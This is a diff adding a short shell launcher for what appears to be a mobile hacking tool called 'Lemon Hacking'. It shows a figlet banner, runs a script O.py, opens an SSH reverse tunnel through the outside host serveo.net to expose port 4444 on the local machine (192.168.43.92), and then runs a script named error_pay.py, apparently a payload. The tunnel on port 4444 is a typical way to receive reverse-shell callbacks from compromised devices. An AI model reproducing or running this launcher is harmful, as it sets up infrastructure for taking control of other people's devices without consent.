@@ -1,0 +1,7 @@
+clear
+figlet L e m o n
+figlet H a c k i n g
+python $PREFIX/opt/O.py
+ssh -o "ExitOnForwardFailure yes" -R 4444:192.168.43.92:4444 serveo.net
+clear
+python $PREFIX/opt/error_pay.py
